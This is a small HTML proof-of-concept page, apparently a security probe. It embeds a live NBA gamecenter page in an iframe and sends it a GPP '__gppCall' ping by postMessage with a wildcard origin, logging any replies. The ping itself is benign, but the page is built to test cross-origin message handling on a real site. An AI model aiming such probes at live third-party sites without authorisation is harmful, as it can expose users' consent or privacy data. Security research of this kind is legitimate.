<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>GPP Message Exploit Test</title>
</head>
<body>
  <h1>GPP Message Test</h1>

  <iframe id="targetFrame" src="https://gamecenter.nba.com/nba-fankit-v1/production/index.html?h=cdn-us.monterosa.cloud&p=559f4abc-a54e-4c87-98f5-acba50aeb7bb&e=dc5b4dbb-73d5-4b53-a59c-184e46e12b67#/" width="800" height="600"></iframe>

  <button onclick="sendGppMessage()">Send GPP Ping</button>

  <pre id="log" style="background:#eee;padding:10px;"></pre>

  <script>
    const log = (msg) => {
      document.getElementById("log").textContent += msg + "\n";
    };

    // Listen for messages from iframe
    window.addEventListener("message", (event) => {
      if (event.data?.__gppReturn || event.data?.__gppCall) {
        log("Received message: " + JSON.stringify(event.data, null, 2));
      }
    });

    // Send GPP ping message to iframe
    function sendGppMessage() {
      const iframe = document.getElementById("targetFrame");
      iframe.contentWindow.postMessage({
        __gppCall: {
          command: "ping",
          parameter: null,
          callId: "exploit123"
        }
      }, "*");
      log("Sent ping message");
    }
  </script>
</body>
</html>
